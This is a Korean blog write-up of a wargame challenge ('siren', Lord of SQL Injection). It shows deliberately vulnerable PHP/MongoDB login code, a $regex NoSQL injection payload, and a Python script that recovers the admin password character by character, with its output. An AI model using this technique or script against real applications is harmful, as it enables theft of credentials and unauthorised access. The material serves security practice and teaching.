---
title: "[Lord of SQL Injection] LoS - siren 문제풀이"
date: 2019-08-06
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

`MongoDB`의 두 번째 문제인 `siren`이다.
이번 문제를 풀기 위해서는 소스코드를 구현해야 한다.  

<!--more-->

코드는 다음과 같다.  

```php
---------------------------------
query : {"id":null,"pw":null}
---------------------------------

<?php
  include "./config.php";
  login_chk();
  $db = mongodb_connect();
  $query = array(
    "id" => $_GET['id'],
    "pw" => $_GET['pw']
  );
  echo "<hr>query : <strong>".json_encode($query)."</strong><hr><br>";
  $result = mongodb_fetch_array($db->prob_siren->find($query));
  if($result['id']) echo "<h2>Hello User</h2>";

  $query = array("id" => "admin");
  $result = mongodb_fetch_array($db->prob_siren->find($query));
  if($result['pw'] === $_GET['pw']) solve("siren");
  highlight_file(__FILE__);
?>
```

이번 문제를 풀기 위해서는 `id`가 `admin`일 때의 `pw` 값을 정확하게 알아야 한다.
따라서 `Blind SQL Injection`을 사용하여 `pw`의 값을 알아내야 한다.
어떻게 풀까 찾아 보다가 `$regex`를 찾을 수 있었다.
`$regex`을 사용하면 정규표현식을 활용 해 패턴으로 검색을 할 수 있다.
사용법은 다음과 같다.  

```plain
?id=admin&pw[$regex]=^
```

여기서 `^`는 `MySQL`에서의 `%`와 같은 역할을 한다.
따라서 `^` 뒤에 문자를 하나씩 추가 해 `pw`의 값을 하나 씩 알아낼 수 있다.
이를 위해 아래와 같이 코드를 구현했다.  

```python
import requests

flag = ""

url = "https://los.rubiya.kr/chall/siren_9e402fc1bc38574071d8369c2c3819ba.php?id=admin&pw[$regex]="
session = dict(PHPSESSID = "YOUR SESSION ID")

print "[+] Start"

print "[+] Find password"

for j in range(1, 10):
	for i in range(48, 123):
		if i != 0x3f:
			found = 0
			try:
				query = url + "^" + flag + chr(i)
				r = requests.post(query, cookies=session)
			except:
				print "[-] Error occur"
				continue

			if 'Hello User' in r.text:
				flag += chr(i)
				found = 1
				print "[+] Found " + str(j), ":", flag
				break
	if not found:
		break

print "[+] Found password : ", flag
print "[+] End"
```

실행 한 결과는 다음과 같다.  

```bash
$ python ex.py
[+] Start
[+] Find password
[+] Found 1 : 1
[+] Found 2 : 15
[+] Found 3 : 158
[+] Found 4 : 1588
[+] Found 5 : 1588f
[+] Found 6 : 1588f5
[+] Found 7 : 1588f5a
[+] Found 8 : 1588f5a3
[+] Found password :  1588f5a3
[+] End
```

결과로 나온 값을 아래와 같이 입력하면 문제를 풀 수 있다.  

```plain
?id=admin&pw=1588f5a3
```

---

```php
----------------------------------------------------------
query : {"id":"admin","pw":"1588f5a3"}
----------------------------------------------------------

Hello User
SIREN Clear!

<?php
  include "./config.php";
  login_chk();
  $db = mongodb_connect();
  $query = array(
    "id" => $_GET['id'],
    "pw" => $_GET['pw']
  );
  echo "<hr>query : <strong>".json_encode($query)."</strong><hr><br>";
  $result = mongodb_fetch_array($db->prob_siren->find($query));
  if($result['id']) echo "<h2>Hello User</h2>";

  $query = array("id" => "admin");
  $result = mongodb_fetch_array($db->prob_siren->find($query));
  if($result['pw'] === $_GET['pw']) solve("siren");
  highlight_file(__FILE__);
?>
```

---

```bash
SIREN Clear!!
```